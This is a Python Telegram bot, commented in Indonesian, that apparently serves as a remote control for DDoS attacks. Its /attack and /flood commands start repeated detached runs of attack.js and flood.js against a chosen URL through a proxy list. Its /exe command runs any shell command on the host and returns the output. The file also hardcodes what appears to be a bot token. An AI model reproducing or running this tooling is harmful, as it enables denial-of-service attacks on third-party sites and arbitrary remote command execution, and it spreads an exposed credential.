import telebot
import subprocess

# Inisialisasi Bot API Token dan daftar ID admin
TOKEN = '6540852300:AAEJnS8-tOWnP1YOg_ZU1sh75NLbAxiNisM'
admin_ids = ['6803990183']
bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=['start'])
def handle_start_command(message):
    # Menampilkan panduan saat pengguna menggunakan perintah /start
    bot.reply_to(message, "Yo Whatsapp @sedihbetgw")


@bot.message_handler(commands=['attack'])
def handle_get_command(message):
    # Cek apakah pengguna adalah admin
    if str(message.from_user.id) not in admin_ids:
        bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan perintah ini.")
        return

    # Mendapatkan argumen dari message
    command_parts = message.text.split()
    if len(command_parts) < 5:
        bot.reply_to(message, "Format perintah tidak valid. Gunakan /attack [url] [port] [time] [count].")
        return
    url = command_parts[1]
    port = command_parts[2]
    time = command_parts[3]
    count = command_parts[4]

    # Membentuk perintah screen
    screen_command = f"screen -dm node attack.js {url} {time} 15 8 proxy.txt"
    
    # Menjalankan perintah screen sebanyak count kali
    for _ in range(int(count)):
        subprocess.run(screen_command, shell=True)
    
    # Mengirim pesan ke Chat ID pengguna
    bot.reply_to(message, f"ATTACK STARTED\n\nTarget: {url}\nPort: {port}\nTime: {time}\nConccurents: {count}\n\n@sedihbetgw")
    
    
@bot.message_handler(commands=['flood'])
def handle_get_command(message):
    # Cek apakah pengguna adalah admin
    if str(message.from_user.id) not in admin_ids:
        bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan perintah ini.")
        return

    # Mendapatkan argumen dari message
    command_parts = message.text.split()
    if len(command_parts) < 5:
        bot.reply_to(message, "Format perintah tidak valid. Gunakan /flood [url] [port] [time] [count].")
        return
    url = command_parts[1]
    port = command_parts[2]
    time = command_parts[3]
    count = command_parts[4]

    # Membentuk perintah screen
    screen_command = f"screen -dm node flood.js {url} {time} 15 8 proxy.txt"
    
    # Menjalankan perintah screen sebanyak count kali
    for _ in range(int(count)):
        subprocess.run(screen_command, shell=True)
    
    # Mengirim pesan ke Chat ID pengguna
    bot.reply_to(message, f"FLOOD ATTACK STARTED\n\nTarget: {url}\nPort: {port}\nTime: {time}\nConccurents: {count}\n\n@sedihbetgw")


@bot.message_handler(commands=['exe'])
def handle_exe_command(message):
    # Cek apakah pengguna adalah admin
    if str(message.from_user.id) not in admin_ids:
        bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan perintah ini.")
        return

    # Mendapatkan argumen dari message
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Format perintah tidak valid. Gunakan /exe [command].")
        return
    command = ' '.join(command_parts[1:])

    # Menjalankan perintah menggunakan subprocess
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    # Mengirim pesan ke Chat ID pengguna
    bot.reply_to(message, f"Output:\n\n{result.stdout}")


@bot.message_handler(commands=['stop'])
def handle_stop_command(message):
    # Cek apakah pengguna adalah admin
    if str(message.from_user.id) not in admin_ids:
        bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan perintah ini.")
        return

    # Menjalankan perintah killall screen menggunakan subprocess
    subprocess.run("killall screen", shell=True)

    # Mengirim pesan ke Chat ID pengguna
    bot.reply_to(message, "STOP ALL ATTACK")


@bot.message_handler(func=lambda message: True)
def handle_other_commands(message):
    # Menampilkan pesan kesalahan saat pengguna mengirim perintah selain /start, /get, /exe, /stop
    bot.reply_to(message, "GELUT JINK")


# Memulai bot
bot.polling()
